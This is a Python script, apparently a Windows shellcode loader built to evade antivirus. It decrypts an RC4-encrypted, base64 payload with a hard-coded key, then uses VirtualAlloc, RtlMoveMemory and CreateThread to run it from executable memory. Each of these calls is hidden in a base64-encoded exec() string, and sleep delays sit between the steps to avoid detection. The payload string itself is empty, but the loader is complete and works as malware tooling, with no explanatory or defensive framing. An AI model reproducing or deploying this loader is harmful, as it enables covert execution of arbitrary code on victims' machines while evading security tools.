from Crypto.Cipher import ARC4 as rc4cipher
import base64,ctypes,codecs,time

def rc4_algorithm(encrypt_or_decrypt, data, key1):
    if encrypt_or_decrypt == "encrypt":
        key = bytes(key1, encoding='utf-8')
        enc = rc4cipher.new(key)
        res = enc.encrypt(data.encode('utf-8'))
        res=base64.b64encode(res)
        res = str(res,'utf8')
        return res
    elif encrypt_or_decrypt == "decrypt":
        data = base64.b64decode(data)
        key = bytes(key1, encoding='utf-8')
        enc = rc4cipher.new(key)
        res = enc.decrypt(data)
        res = str(res,'utf8')
        return res
key='haogepcbeizhua'
res=''
shellcode=rc4_algorithm('decrypt', base64.b64decode(res), key).encode()
time.sleep(2)
shellcode = shellcode.strip()
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
time.sleep(2)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
time.sleep(2)
#ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
exec(base64.b64decode('cHRyPWN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLGN0eXBlcy5jX2ludCgweDMwMDApLGN0eXBlcy5jX2ludCgweDQwKSk=').decode())
exec(base64.b64decode('YnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQ==').decode())
#buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
time.sleep(2)
exec(base64.b64decode('Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==').decode())
#ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))
#handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
exec(base64.b64decode('aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkp').decode())
#ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
exec(base64.b64decode('Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkp').decode())